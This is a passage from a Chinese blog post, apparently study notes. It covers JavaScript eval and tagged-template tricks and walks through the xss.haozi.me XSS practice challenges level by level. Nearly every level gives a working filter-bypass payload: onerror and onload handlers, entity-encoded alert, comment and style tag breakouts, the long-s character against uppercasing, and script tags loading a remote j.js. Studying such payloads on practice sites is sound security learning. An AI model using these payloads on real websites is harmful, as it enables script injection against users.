class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert\x281\x29&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//上面都是先解析$&amp;#123;&amp;#125;，最后在解析eval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//对于call方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，此时相当于eval(&amp;#x27;alert(1)&amp;#x27;),call相当于将eval内的执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert\x281\x29&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;literal&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;`aaa &lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert&lt;span class=&#34;string&#34;&gt;`1`&lt;/span&gt;&amp;#125;&lt;/span&gt; bbbb`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaa undefined bbbb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//报错，不能对符号编码，因此的prompt不是字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;prompt\x281\x29&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;aaa$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;bbb&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//不弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval(&amp;#x27;aaaa&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//返回[&amp;quot;aaaaaaaaa&amp;quot;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval([&amp;quot;aaaaaaaaa&amp;quot;]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//eval只能接收第一个参数的值，他只有一个参数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;[&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, raw: Array(2)]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//`&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&amp;#x27;prompt(1)&amp;#x27;,但eval不接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;prompt(1)&amp;#x27;&lt;/span&gt;&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;[&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, raw: Array(2)]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//输入11111,打印11111.&amp;#123;&amp;#125;首先执行，返回([&amp;quot;&amp;quot;,&amp;quot;&amp;quot;],&amp;#x27;prompt(1)&amp;#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&amp;#x27;prompt(1)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval(&amp;#x27;prompt(1)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;11111&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;prompt(1)&amp;#x27;&lt;/span&gt;&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;11111&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//输入aaaa,打印aaaa undefined.&amp;#123;&amp;#125;首先执行，返回([&amp;quot;&amp;quot;,&amp;quot;&amp;quot;],&amp;#x27;prompt(1)&amp;#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Uncaught ReferenceError: aaaa is not defined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;模板字符串中需要有表达式 ${} 才能执行 eval``&lt;/p&gt;
&lt;p&gt;eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回&lt;/p&gt;
&lt;p&gt;alert 有 tostring 方法，将数字专为字符串执行&lt;/p&gt;
&lt;p&gt;eval 没有 tostring，将数字放入数组中&lt;/p&gt;
&lt;p&gt;模板字符串可以解析 16 进制和 Unicode&lt;/p&gt;
&lt;p&gt;call 用来改变 this 指向&lt;/p&gt;
&lt;h2 id=&#34;httpsxsshaozime&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#httpsxsshaozime&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94c3MuaGFvemkubWUv&#34;&gt;https://xss.haozi.me/&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDA3NzU0NC9hcnRpY2xlL2RldGFpbHMvOTUwOTQ3NTk=&#34;&gt;https://blog.csdn.net/weixin_44077544/article/details/95094759&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;0x03&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;javascript:alert&amp;amp;#40;1&amp;amp;#41;&amp;quot;&amp;gt;aaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=1 onerror=&amp;quot;alert`1`&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x05&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;--!&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;--!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x06&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;onclick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=alert(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type=&amp;quot;image&amp;quot; src=1 onerror=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alert(1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x07&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;#x27;1&amp;#x27; onerror=&amp;#x27;alert(1)&amp;#x27;//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x08&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/style&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x09&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=https://www/segmentfault.com&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x0A&lt;/p&gt;
&lt;p&gt;只有 Firefox 可以进行跳转&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://www.segmentfault.com@xss.haozi.com/j.js&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;http/https @ 会匹配后面一个并进行重定向&lt;/p&gt;
&lt;p&gt;ftp @前是用户名，后是 password&lt;/p&gt;
&lt;p&gt;0x0B&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=1 onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=1 onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;(1)&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;(1)&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;scripscriptt src=&amp;quot;https://xss.haozi.me/j.js&amp;quot;&amp;gt;&amp;lt;/scripscriptt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;cript src=&amp;quot;https://xss.haozi.me/j.js&amp;quot;&amp;gt;&amp;lt;/cript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x0C&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;同0x0B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x0D&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alert(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220912152740785.png&#34; alt=&#34;image-20220912152740785&#34;&gt;&lt;/p&gt;
&lt;p&gt;0x0E&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ſ用在有转大写时&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;ſcript src=&amp;quot;https://xss.haozi.me/j.js&amp;quot;&amp;gt;&amp;lt;/ſcript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;ſvg onload=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x0F&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27;);alert(1)//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x10&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;执行 `中的代码,es6模板字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alert(1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x11&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;?;alert(1)/.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
